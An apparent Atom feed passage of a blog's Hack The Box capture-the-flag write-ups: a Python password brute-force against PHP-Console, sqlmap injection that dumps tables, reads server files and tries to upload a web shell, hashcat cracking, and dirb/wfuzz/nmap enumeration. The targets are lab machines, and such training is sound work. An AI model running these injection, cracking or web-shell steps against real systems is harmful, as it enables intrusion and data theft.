&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Create HTTP GET request with url and HTTP headers
&lt;&#x2F;span&gt;&lt;span&gt;   r = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headers)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Append php-console to the GET request HTTP header
&lt;&#x2F;span&gt;&lt;span&gt;   phpconsoleclient = r.headers[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PHP-Console&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt;   phpconsoleclient = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(phpconsoleclient)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Print the word in the current interation when isSuccess equals to True. This is the word that will allow access to PHP-Console chrome plugin.
&lt;&#x2F;span&gt;&lt;span&gt;   status = phpconsoleclient[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;auth&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;][&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;isSuccess&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(status != &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(word)
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# close rockyou.txt
&lt;&#x2F;span&gt;&lt;span&gt;file.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Running the python script will uncover the password and upon PHP-Console login, the flag can be found in the Chrome console.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-6.png&quot; alt=&quot;htb-console-6.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-7.png&quot; alt=&quot;htb-console-7.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-8.png&quot; alt=&quot;htb-console-8.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Freelancer</title>
        <published>2020-06-12T00:00:00+00:00</published>
        <updated>2020-06-12T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-freelancer/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-freelancer/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The challenge: &amp;quot;Can you test how secure my website is? Prove me wrong and capture the flag!&amp;quot; The URL leads to a web page made by a freelancer.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;First thing I usually do is inspect the website by clicking around and see what it does, inspect the text, links, and source code for hints. I stumbled upon a contact form that might be of interest. I tried sending some dud info and see what I can find in &lt;code&gt;burpsuite&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-1.png&quot; alt=&quot;htb-freelancer-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-2.png&quot; alt=&quot;htb-freelancer-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Upon inspection of the source code, I noticed there was a comment in the code about the contact form. I tested further in &lt;code&gt;burpsuite&lt;&#x2F;code&gt; to see what I can find but nothing interesting was found.&lt;&#x2F;p&gt;
&lt;p&gt;I dug around the source code again and see what else I could find and I stumbled upon this piece of code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-3.png&quot; alt=&quot;htb-freelancer-3.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-4.png&quot; alt=&quot;htb-freelancer-4.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Looks like a possible SQL injection. I tested all the parameters to double check to see if it&#x27;s really stored in a database. Parameter ID=4 will show up blank which means the parameter is fetching data stored from a database.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-5.png&quot; alt=&quot;htb-freelancer-5.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Time to test for SQL injection using &lt;code&gt;sqlmap&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31529&#x2F;portfolio.php?id=1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-6.png&quot; alt=&quot;htb-freelancer-6.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Tada. SQL injection vulnerability is found. Time to enumerate the database. Let&#x27;s see what tables are stored in the database.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31529&#x2F;portfolio.php?id=1 --tables
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-7.png&quot; alt=&quot;htb-freelancer-7.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There is a table named &lt;code&gt;safeadmin&lt;&#x2F;code&gt;, let&#x27;s take a look what is inside.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31529&#x2F;portfolio.php?id=1 -T safeadmin --dump
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-8.png&quot; alt=&quot;htb-freelancer-8.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-9.png&quot; alt=&quot;htb-freelancer-9.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Looks like a &lt;code&gt;bcrypt&lt;&#x2F;code&gt; hash, this doesn&#x27;t look too good in terms of brute forcing for a password since it will take a lot of time and resources due to the nature of &lt;code&gt;bcrypt&lt;&#x2F;code&gt; encryption. I&#x27;ll try it anyway for the sake of example.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo hashcat -a 0 -m 3200 bcrypt.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-10.png&quot; alt=&quot;htb-freelancer-10.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Seeing that this is &lt;code&gt;bcrypt&lt;&#x2F;code&gt; hash is unbreakable. Time to go back to enumerate the website since I haven&#x27;t done it yet. If it made you wonder why I didn&#x27;t do this at the beginning, I usually roam through the website and source code for hidden links or comments that may give clues.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-11.png&quot; alt=&quot;htb-freelancer-11.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;administrat&lt;&#x2F;code&gt; directory has been found. Upon navigating to the URL, it appears to be a login page. I tried using SQL injection administrator bypass techniques but wasn&#x27;t successful. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-12.png&quot; alt=&quot;htb-freelancer-12.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s see what files I can find inside &lt;code&gt;&#x2F;administrat&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-13.png&quot; alt=&quot;htb-freelancer-13.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;administrat&#x2F;panel.php&lt;&#x2F;code&gt; was found. Upon navigating to the URL, it redirects my connection to &lt;code&gt;&#x2F;administrat&#x2F;index.php&lt;&#x2F;code&gt;. Strange.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After taking a look around once again and figuring out my next steps, I decided to take a look at what database privileges I have using SQL injection. &lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31689&#x2F;portfolio.php?id=1 --privileges
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[21:07:06] [INFO] the back-end DBMS is MySQL
&lt;&#x2F;span&gt;&lt;span&gt;back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork)
&lt;&#x2F;span&gt;&lt;span&gt;[21:07:06] [INFO] fetching database users privileges
&lt;&#x2F;span&gt;&lt;span&gt;database management system users privileges:
&lt;&#x2F;span&gt;&lt;span&gt;[*] &amp;#39;db_user&amp;#39;@&amp;#39;%&amp;#39; (administrator) [28]:
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: ALTER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: ALTER ROUTINE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE ROUTINE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE TABLESPACE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE TEMPORARY TABLES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE USER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE VIEW
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: DELETE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: DROP
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: EVENT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: EXECUTE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: FILE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: INDEX
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: INSERT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: LOCK TABLES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: PROCESS
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REFERENCES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: RELOAD
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REPLICATION CLIENT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REPLICATION SLAVE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SELECT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHOW DATABASES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHOW VIEW
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHUTDOWN
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SUPER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: TRIGGER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: UPDATE
&lt;&#x2F;span&gt;&lt;span&gt;[*] &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; (administrator) [28]:
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: ALTER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: ALTER ROUTINE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE ROUTINE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE TABLESPACE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE TEMPORARY TABLES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE USER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: CREATE VIEW
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: DELETE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: DROP
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: EVENT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: EXECUTE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: FILE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: INDEX
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: INSERT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: LOCK TABLES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: PROCESS
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REFERENCES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: RELOAD
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REPLICATION CLIENT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: REPLICATION SLAVE
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SELECT
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHOW DATABASES
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHOW VIEW
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SHUTDOWN
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: SUPER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: TRIGGER
&lt;&#x2F;span&gt;&lt;span&gt;   privilege: UPDATE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;What is my current user?&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31689&#x2F;portfolio.php?id=1 --current-user
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-14.png&quot; alt=&quot;htb-freelancer-14.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Okay, so I know now that I have privileges to &lt;code&gt;FILE&lt;&#x2F;code&gt; which means I can read and maybe write files as &lt;code&gt;db_user&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The next idea I had was uploading a php web shell using &lt;code&gt;sqlmap&lt;&#x2F;code&gt; and see if I can execute basic OS commands.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[22:02:04] [INFO] the back-end DBMS is MySQL
&lt;&#x2F;span&gt;&lt;span&gt;back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork)
&lt;&#x2F;span&gt;&lt;span&gt;[22:02:04] [INFO] fingerprinting the back-end DBMS operating system
&lt;&#x2F;span&gt;&lt;span&gt;[22:02:04] [INFO] the back-end DBMS operating system is Linux
&lt;&#x2F;span&gt;&lt;span&gt;[22:02:04] [WARNING] expect junk characters inside the file as a leftover from UNION query
&lt;&#x2F;span&gt;&lt;span&gt;do you want confirmation that the local file &amp;#39;Simple-PHP-Web-Shell&#x2F;shell.php&amp;#39; has been successfully written on the back-end DBMS file system (&amp;#39;&#x2F;var&#x2F;www&#x2F;html&amp;#39;)? [Y&#x2F;n] 
&lt;&#x2F;span&gt;&lt;span&gt;[22:02:05] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like my write permissions is not working or I don&#x27;t have enough privileges. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Not sure what I needed to do here, I decided to see what kind of files I can read on the system itself. Since &lt;code&gt;panel.php&lt;&#x2F;code&gt; was acting a bit strange with the redirection, I wonder if there was hidden code inside the php file.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u http:&#x2F;&#x2F;docker.hackthebox.eu:31689&#x2F;portfolio.php?id=1 --file-read &#x2F;var&#x2F;www&#x2F;html&#x2F;administrat&#x2F;panel.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;---
&lt;&#x2F;span&gt;&lt;span&gt;[22:05:55] [INFO] the back-end DBMS is MySQL
&lt;&#x2F;span&gt;&lt;span&gt;back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork)
&lt;&#x2F;span&gt;&lt;span&gt;[22:05:55] [INFO] fingerprinting the back-end DBMS operating system
&lt;&#x2F;span&gt;&lt;span&gt;[22:05:55] [INFO] the back-end DBMS operating system is Linux
&lt;&#x2F;span&gt;&lt;span&gt;[22:05:55] [INFO] fetching file: &amp;#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;administrat&#x2F;panel.php&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;do you want confirmation that the remote file &amp;#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;administrat&#x2F;panel.php&amp;#39; has been successfully downloaded from the back-end DBMS file system? [Y&#x2F;n] 
&lt;&#x2F;span&gt;&lt;span&gt;[22:05:57] [INFO] the local file &amp;#39;&#x2F;home&#x2F;jtuyen&#x2F;.sqlmap&#x2F;output&#x2F;docker.hackthebox.eu&#x2F;files&#x2F;_var_www_html_administrat_panel.php&amp;#39; and the remote file &amp;#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;administrat&#x2F;panel.php&amp;#39; have the same size (880 B)                                                                                                                      
&lt;&#x2F;span&gt;&lt;span&gt;files saved to [1]:
&lt;&#x2F;span&gt;&lt;span&gt;[*] &#x2F;home&#x2F;jtuyen&#x2F;.sqlmap&#x2F;output&#x2F;docker.hackthebox.eu&#x2F;files&#x2F;_var_www_html_administrat_panel.php (same file)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I didn&#x27;t expect this to happen but the &lt;code&gt;panel.php&lt;&#x2F;code&gt; code contains the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-freelancer&#x2F;htb-freelancer-15.png&quot; alt=&quot;htb-freelancer-15.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Fuzzy</title>
        <published>2020-06-12T00:00:00+00:00</published>
        <updated>2020-06-12T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-fuzzy/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-fuzzy/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The challenge: &amp;quot;We have gained access to some infrastructure which we believe is connected to the internal network of our target. We need you to help obtain the administrator password for the website they are currently developing.&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-1.png&quot; alt=&quot;htb-fuzzy-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The links don&#x27;t lead to anywhere. Judging from the text in the site, there is some sort of reset function hidden somewhere. I&#x27;m going to use &lt;code&gt;dirb&lt;&#x2F;code&gt; to fuzz a possible directory.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-2.png&quot; alt=&quot;htb-fuzzy-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;api&lt;&#x2F;code&gt; directory has been discovered.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;&#x2F;api&lt;&#x2F;code&gt; directory doesn&#x27;t seem to load anything. I&#x27;m going to continue fuzzing the &lt;code&gt;&#x2F;api&lt;&#x2F;code&gt; directory for possible files.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-3.png&quot; alt=&quot;htb-fuzzy-3.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Bingo. &lt;code&gt;&#x2F;api&#x2F;action.php&lt;&#x2F;code&gt; file has been discovered. Although, navigating to the URL leads to a text &amp;quot;Error: Parameter not set&amp;quot;. I guess this is a fuzzing challenge. FYI, I was using &lt;code&gt;burpsuite&lt;&#x2F;code&gt; the whole time hence why in my last command, I knew to add php as the extension to look for because of the server response header.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-4.png&quot; alt=&quot;htb-fuzzy-4.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using &lt;code&gt;wfuzz&lt;&#x2F;code&gt; this time to see if I could fuzz the parameter name because I tried all the commonly used parameters used in most web apps.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-5.png&quot; alt=&quot;htb-fuzzy-5.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I didn&#x27;t seem to get any hits, well I&#x27;m not even sure if I did because the screen kept on scrolling. After reading the &lt;code&gt;wfuzz&lt;&#x2F;code&gt; documentation, there is a way to hide results that is based on the number characters shown on screen. If the character deviates from the preset, it will highlight the result. Judging from the results, I need to filter out 24 character responses. Let&#x27;s try this again.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-6.png&quot; alt=&quot;htb-fuzzy-6.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Parameter has been found. Although, now I&#x27;m running into an ID not matching issue. Time to fuzz some more. This time I&#x27;m going to filter out 27 character long responses.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-7.png&quot; alt=&quot;htb-fuzzy-7.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Bingo. We can now capture the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-fuzzy&#x2F;htb-fuzzy-8.png&quot; alt=&quot;htb-fuzzy-8.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Monteverde</title>
        <published>2020-03-28T00:00:00+00:00</published>
        <updated>2020-03-28T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-monteverde/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-monteverde/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;My usual &lt;code&gt;nmap&lt;&#x2F;code&gt; scan is being blocked. Must be that the machine&#x27;s firewall is blocking the requests.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ nmap -sC -sV -oA nmap monteverde
&lt;&#x2F;span&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-21 10:03 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
&lt;&#x2F;span&gt;&lt;span&gt;Nmap done: 1 IP address (0 hosts up) scanned in 3.38 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using the &lt;code&gt;-Pn&lt;&#x2F;code&gt; switch, I discovered the open ports without sending pings to the machine and validates my hypothesis about a possible firewall.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ nmap -Pn 10.10.10.172
&lt;&#x2F;span&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-21 10:04 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Nmap scan report for monteverde (10.10.10.172)
&lt;&#x2F;span&gt;&lt;span&gt;Host is up (0.037s latency).
&lt;&#x2F;span&gt;&lt;span&gt;Not shown: 989 filtered ports
&lt;&#x2F;span&gt;&lt;span&gt;PORT     STATE SERVICE\
&lt;&#x2F;span&gt;&lt;span&gt;53&#x2F;tcp   open  domain
&lt;&#x2F;span&gt;&lt;span&gt;88&#x2F;tcp   open  kerberos-sec
&lt;&#x2F;span&gt;&lt;span&gt;135&#x2F;tcp  open  msrpc
&lt;&#x2F;span&gt;&lt;span&gt;139&#x2F;tcp  open  netbios-ssn
